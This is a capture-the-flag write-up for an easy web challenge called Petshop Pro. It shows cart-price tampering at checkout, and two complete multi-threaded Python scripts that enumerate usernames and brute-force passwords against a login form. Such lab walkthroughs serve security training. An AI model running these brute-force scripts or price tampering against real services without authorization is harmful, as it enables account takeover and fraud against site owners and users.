# Petshop Pro

**Difficulty**: Easy  
**Skills**: Web  
**Number of Flags**: 3
_____

Quick notes while testing:

- link pages uses RESTful syntax
- /login => 200 OK
    - username
    - password
    - invalid username/password: invalid username ... username enumeration?

_____

### Flag 0

Capturing requests in Burp Proxy shows that products are returned in an array style:  

```
[[0, {&#34;name&#34;: &#34;Kitten&#34;, &#34;desc&#34;: &#34;8\&#34;x10\&#34; color glossy photograph of a kitten.&#34;, &#34;logo&#34;: &#34;kitten.jpg&#34;, &#34;price&#34;: 8.95}]]
```

The first value is the **id** used to add prodcuts in the request GET **/add/{id}**. What follows is an array/dictionary which contains key/value pairs.

When checking out, a POST request is sent to **/checkout** with parameter **cart** in the message body.  
This parameter carries the array(s) of all items in the cart.  

Using Burp Repeater it is possible to tamper the data. In order to retireve the flag all prices must be set to 0.

_Values in **cart** parameter must be urlencoded_
<img src="https://github.com/jupitersinsight/writeups/assets/110602224/b0c58c78-a9c7-489f-974f-ea9c07be1552" width=900 height=auto>

_____

### Flag 1

Crawl the application for hidden resources, you will land at **/login**.  
Try input some random credentials like _admin:admin_. You should notice that the application returns a message... **Invalid username**.  
This might be very helpful while enumerating usernames.  
Let's script a simple multi-threaded python bruteforcer and feed it usernames list:
```python
import requests
import sys
import urllib3
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# PROXY ALL REQUESTS THROUGH BURP
proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def postRequest(s, target_url, username):
    # DEFINE ARGUMENTS TO SEND ALONG THE POST REQUEST
    params = {
        'username' : username,
        'password' : 'notapassword'
    }

    # SEND REQUEST
    r = s.post(target_url, data=params, verify=False, proxies=proxies)

    # CHECK IF USERNAME IS VALID
    if "Invalid username" not in r.text:
        return username, r.status_code



def main():
    if len(sys.argv) != 2:
        print("[-] Wrong number of arguments!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    s = requests.Session()

    target_url = url + '/login'
    usernames = []
    
    # LOAD USERNAMES IN A LIST
    with open(r'.\usernames.txt', 'r') as file:
        print("[+] Loading all usernames in a list...")
        for line in file.readlines():
            username = line.strip()
            sys.stdout.write("[+] Added username %s\r" % username)
            sys.stdout.flush()
            sys.stdout.write("\033[K")
            usernames.append(username)
        
    how_many_usernames = len(usernames)
    print("[+] All set! %i usernames loaded" % how_many_usernames)

    # START THREADED EXECUTION
    with ThreadPoolExecutor (max_workers=5) as executor:
        future_to_url = {executor.submit(postRequest, s, target_url, username) for username in usernames}
        for future in concurrent.futures.as_completed(future_to_url):
            try:
                
                    data = future.result()
                    if data:
                        print(data[0], data[1])
                

            except Exception as exc:
                print("[-] Error: %s" % exc)

if __name__ == "__main__":
    main()
```
**Important, the scripts in this writeups are raw, meaning that you need to kill the process in order to actually stop script execution**

Run the script and wait for a pair _username:statuscode[200]_ to be printed in console.  
Double check that the username is valid though BurpRepeater.  
<img src="https://github.com/jupitersinsight/writeups/assets/110602224/fc3a50d9-6720-416a-a020-17e338d14e55" width=900 height=auto>

Once you find the correct username, bruteforce the password.  
Slightly change the script:
```python
import requests
import sys
import urllib3
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def postRequest(s, target_url, password):
    # DEFINE ARGUMENTS TO SEND ALONG THE POST REQUEST
    params = {
        'username' : 'nona',
        'password' : password
    }

    # SEND REQUEST
    r = s.post(target_url, data=params, verify=False, proxies=proxies)

    # CHECK IF PASSWORD IS VALID
    if "Invalid password" not in r.text:
        return password, r.status_code



def main():
    if len(sys.argv) != 2:
        print("[-] Wrong number of arguments!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    s = requests.Session()

    target_url = url + '/login'
    passwords = []
    
    # LOAD PASSWORDS IN A LIST
    with open(r'.\passwords.txt', 'r') as file:
        print("[+] Loading all passwords in a list...")
        for line in file.readlines():
            password = line.strip()
            sys.stdout.write("[+] Added passwords %s\r" % password)
            sys.stdout.flush()
            sys.stdout.write("\033[K")
            passwords.append(password)
        
    how_many_passwords = len(passwords)
    print("[+] All set! %i passwords loaded" % how_many_passwords)

    # START THREADED EXECUTION

    with ThreadPoolExecutor (max_workers=5) as executor:
        future_to_url = {executor.submit(postRequest, s, target_url, password) for password in passwords}
        for future in concurrent.futures.as_completed(future_to_url):
            try:
                
                    data = future.result()
                    if data:
                        print(data[0], data[1])
                

            except Exception as exc:
                print("[-] Error: %s" % exc)

if __name__ == "__main__":
    main()
```
Double check the password to be valid in BurpRepeater.  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/d0d2f17d-0845-439a-962a-326c16a6b411" width=900 height=auto>  

Follow the redirection to **/** and extract the flag.  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/3163000f-b7a4-4931-aabb-5b781d9fa7d1" width=900 height=auto>


